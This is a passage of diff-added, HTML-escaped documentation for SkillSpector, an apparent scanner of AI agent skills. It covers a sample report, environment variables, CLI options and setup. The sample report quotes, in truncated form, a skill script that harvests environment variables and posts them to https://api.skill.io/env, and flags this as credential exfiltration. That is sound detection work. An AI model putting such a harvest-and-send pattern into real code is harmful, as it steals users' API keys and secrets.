+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;n&#34;&gt;SkillSpector&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Security&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Report&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;v2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Skill&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;suspicious&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;skill&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Source&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;./&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;suspicious&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;skill&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Scanned&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2026&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;01&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;29&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;UTC&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Risk&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Assessment&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;n&#34;&gt;Metric&lt;/span&gt;          &lt;span class=&#34;n&#34;&gt;Value&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;n&#34;&gt;Score&lt;/span&gt;           &lt;span class=&#34;mi&#34;&gt;78&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;n&#34;&gt;Severity&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;HIGH&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;n&#34;&gt;Recommendation&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;DO&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;NOT&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;INSTALL&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Components&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;ne&#34;&gt;File&lt;/span&gt;              &lt;span class=&#34;n&#34;&gt;Type&lt;/span&gt;      &lt;span class=&#34;n&#34;&gt;Lines&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;Executable&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;n&#34;&gt;SKILL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;md&lt;/span&gt;          &lt;span class=&#34;n&#34;&gt;markdown&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;142&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;No&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;n&#34;&gt;scripts&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sync&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;py&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;python&lt;/span&gt;       &lt;span class=&#34;mi&#34;&gt;87&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;Yes&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;n&#34;&gt;requirements&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;txt&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;          &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;No&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Issues&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;HIGH&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Env&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Variable&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Harvesting&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;scripts&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sync&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;py&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;23&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Finding&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;val&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;environ&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;items&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Confidence&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;94&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Explanation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;This&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;code&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;collects&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;environment&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;variables&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;containing&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;API&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;keys&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;secrets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;then&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sends&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;them&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;an&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;external&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;HIGH&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;External&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Transmission&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;scripts&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sync&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;py&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;45&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Finding&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;https://api.skill.io/env&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Confidence&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;89&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Explanation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Data&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;being&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sent&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;an&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;external&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Combined&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;env&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;harvesting&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;above&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;this&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;indicates&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;credential&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exfiltration&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;configuration&#34;&gt;Configuration
+&lt;/h2&gt;&lt;h3 id=&#34;environment-variables&#34;&gt;Environment Variables
+&lt;/h3&gt;&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;Variable&lt;/th&gt;
+					&lt;th&gt;Description&lt;/th&gt;
+					&lt;th&gt;Required&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;SKILLSPECTOR_PROVIDER&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;Active LLM provider: &lt;code&gt;openai&lt;/code&gt;, &lt;code&gt;anthropic&lt;/code&gt;, or &lt;code&gt;nv_build&lt;/code&gt;. Each provider has its own bundled &lt;code&gt;model_registry.yaml&lt;/code&gt; and default model (see the LLM Analysis table above). Defaults to &lt;code&gt;nv_build&lt;/code&gt;.&lt;/td&gt;
+					&lt;td&gt;Optional&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;NVIDIA_INFERENCE_KEY&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;Credential for the &lt;code&gt;nv_build&lt;/code&gt; provider (build.nvidia.com).&lt;/td&gt;
+					&lt;td&gt;Required for LLM analysis when &lt;code&gt;SKILLSPECTOR_PROVIDER=nv_build&lt;/code&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;OPENAI_API_KEY&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;Credential for the OpenAI provider (&lt;code&gt;SKILLSPECTOR_PROVIDER=openai&lt;/code&gt;). Also serves as the tier-2 fallback in the credential waterfall when the active provider returns no credentials.&lt;/td&gt;
+					&lt;td&gt;Required for LLM analysis when &lt;code&gt;SKILLSPECTOR_PROVIDER=openai&lt;/code&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;OPENAI_BASE_URL&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;Override the OpenAI endpoint (e.g. point at Ollama).&lt;/td&gt;
+					&lt;td&gt;Optional&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;ANTHROPIC_API_KEY&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;Credential for the Anthropic provider (&lt;code&gt;SKILLSPECTOR_PROVIDER=anthropic&lt;/code&gt;).&lt;/td&gt;
+					&lt;td&gt;Required for LLM analysis when &lt;code&gt;SKILLSPECTOR_PROVIDER=anthropic&lt;/code&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;SKILLSPECTOR_MODEL&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;Override the active provider&amp;rsquo;s default model. See the LLM Analysis table for each provider&amp;rsquo;s default.&lt;/td&gt;
+					&lt;td&gt;Optional&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;SKILLSPECTOR_MODEL_REGISTRY&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;Override the bundled per-provider YAML registry (&lt;code&gt;src/skillspector/providers/&amp;lt;provider&amp;gt;.yaml&lt;/code&gt;) with a custom path.&lt;/td&gt;
+					&lt;td&gt;Optional&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;SKILLSPECTOR_LOG_LEVEL&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;Log level: &lt;code&gt;DEBUG&lt;/code&gt;, &lt;code&gt;INFO&lt;/code&gt;, &lt;code&gt;WARNING&lt;/code&gt;, &lt;code&gt;ERROR&lt;/code&gt; (default: &lt;code&gt;WARNING&lt;/code&gt;).&lt;/td&gt;
+					&lt;td&gt;Optional&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;cli-options&#34;&gt;CLI Options
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;skillspector scan --help
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Options:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  -f, --format &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;terminal&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;json&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;markdown&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;sarif&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Output format &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;default: terminal&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  -o, --output PATH                            Output file path
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  --no-llm                                     Skip LLM analysis &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;static only&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  -V, --verbose                                Show detailed progress
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  --help                                       Show this message and &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;development&#34;&gt;Development
+&lt;/h2&gt;&lt;h3 id=&#34;setup&#34;&gt;Setup
+&lt;/h3&gt;&lt;p&gt;All &lt;code&gt;make&lt;/code&gt; targets assume a virtual environment is already created and activated. The Makefile uses &lt;strong&gt;uv&lt;/strong&gt; if available, else &lt;strong&gt;pip&lt;/strong&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Clone, create venv, activate, install dev dependencies&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/NVIDIA/skillspector.git
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; skillspector
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;uv venv .venv &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt; .venv/bin/activate
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# or: python3 -m venv .venv &amp;amp;&amp;amp; source .venv/bin/activate&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make install-dev
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Run tests&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Run tests with coverage&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make test-cov
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Run linting&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make lint
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Format code&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make format
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;how-it-works&#34;&gt;How It Works
+&lt;/h2&gt;&lt;p&gt;SkillSpector uses a two-stage detection pipeline:&lt;/p&gt;
